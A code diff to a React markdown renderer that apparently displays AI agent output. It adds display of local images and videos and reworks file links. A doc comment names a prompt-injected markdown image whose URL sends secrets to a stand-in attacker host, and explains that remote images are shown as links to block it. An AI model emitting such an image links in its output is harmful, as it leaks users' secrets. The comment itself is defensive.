@@ -8,10 +8,11 @@ import { TICKET_MEDIA_PATH } from "../../src/shared/tickets";
 import { CodeBlock, CodeBlockActions, CodeBlockContent, CodeBlockCopyButton, CodeBlockHeader, CodeBlockLine, CodeBlockTitle } from "@/components/ui/code-block";
 import { highlightLines } from "../code-highlight";
 import type { PullRequestDetail } from "../../src/shared/github";
-import { remarkFilePaths, textFilePath } from "../file-paths";
+import { linkedFile, remarkFilePaths } from "../file-paths";
 import { remarkPromptChips } from "../prompt-tokens";
 import { useRead } from "../reads";
 import { FileLink } from "./file-link";
+import { LocalMedia, MediaStrip } from "./local-media";
 import { BrandMark, LINEAR_LOGO, SLACK_LOGO } from "./integrations/brand-logos";
 import { OrgIcon } from "./org-icon";
 import { isChipKind, PromptChip } from "./prompt-chip";
@@ -33,20 +34,30 @@ const githubImage = (src: string): boolean => inlineImage(src) || ticketMedia(sr
 
 /**
  * An image that loads only from where `allowed` says. Any other would be fetched the moment the text renders, so a
- * prompt-injected `![](https://attacker/?q=<secrets>)` would leak; it shows as a link to the image instead.
+ * prompt-injected `![](https://attacker/?q=<secrets>)` would leak; it shows as a link to the image instead. With
+ * `local`, as in agent text, a path to an image or video on this computer shows it through `GET /api/media`.
  */
 const imageFrom =
-	(allowed: (src: string) => boolean): Components["img"] =>
+	(allowed: (src: string) => boolean, local = false): Components["img"] =>
 	({ node: _node, ...props }: ComponentProps<"img"> & { node?: unknown }) => {
 		const { src, alt } = props;
 		if (typeof src !== "string" || src === "") return <>{alt}</>;
 		if (allowed(src)) return <img {...props} />;
+		const file = local ? linkedFile(src) : null;
+		if (file && file.kind !== "text") return <LocalMedia path={file.path} alt={alt ?? ""} />;
 		return (
 			<a href={src} target="_blank" rel="noopener noreferrer">
 				{alt || src}
 			</a>
 		);
 	};
+
+/** The `figure` that `remarkFilePaths` ends agent text with: the images and videos it names. Markdown makes no other figure. */
+const mediaFigure: Components["figure"] = ({ node }) => {
+	const media = node?.properties.dataMedia;
+	const paths: unknown = typeof media === "string" ? JSON.parse(media) : null;
+	return Array.isArray(paths) ? <MediaStrip paths={paths.filter((path): path is string => typeof path === "string")} /> : null;
+};
 
 function ExternalLink({ href, children, ...props }: ComponentProps<"a">) {
 	let service: "linear" | "github" | "graphite" | "slack" | null = null;
@@ -121,13 +132,13 @@ const video: Components["video"] = ({ node: _node, src }) => {
 	);
 };
 
-/** A link in agent text: a text file's path opens in the file dialog, anything else in a new tab. */
+/** A link in agent text: a file's path opens in the file dialog, anything else in a new tab. */
 const agentLink: Components["a"] = ({ href, children, node: _node, ...props }) => {
-	const path = href === undefined ? null : textFilePath(href);
-	return path === null ? (
+	const file = href === undefined ? null : linkedFile(href);
+	return file === null ? (
 		<ExternalLink {...props} href={href}>{children}</ExternalLink>
 	) : (
-		<FileLink path={path}>{children}</FileLink>
+		<FileLink path={file.path}>{children}</FileLink>
 	);
 };
 
@@ -176,7 +187,7 @@ const codeBlock: Components["pre"] = ({ node }) => {
 	);
 };
 
-const AGENT_COMPONENTS: Components = { a: agentLink, img: imageFrom(inlineImage), pre: codeBlock };
+const AGENT_COMPONENTS: Components = { a: agentLink, img: imageFrom(inlineImage, true), figure: mediaFigure, pre: codeBlock };
 const PROMPT_COMPONENTS: Components = { ...AGENT_COMPONENTS, span: promptChip };
 const GITHUB_COMPONENTS: Components = { a: link, img: imageFrom(githubImage), video, pre: codeBlock };
 
@@ -213,7 +224,8 @@ const agentUrlTransform = (url: string, key: string): string => {
  * (`data:`), or, for `github`, from GitHub's own hosts and from this server's route for a Linear issue's files, which
  * also plays its videos. `github`: text written on GitHub or Linear, whose raw HTML renders as GitHub renders it,
  * through rehype-sanitize's schema, which follows GitHub's; HTML comments drop out, as GitHub hides them. In agent
- * text, the path of a text file opens it in the file dialog, a relative one against `FileBaseContext`. `prompt`: a
+ * text, the path of a file opens it in the file dialog, a relative one against `FileBaseContext`; an image or video on
+ * this computer shows in place when the text writes it as an image, and under the text when it only names it. `prompt`: a
  * user's prompt, read as agent text with its skill, command, file, ticket, pull request, todo, and session references as chips.
  *
  * Parsing and highlighting a long reply is the page's costliest render, so the same text never renders twice.
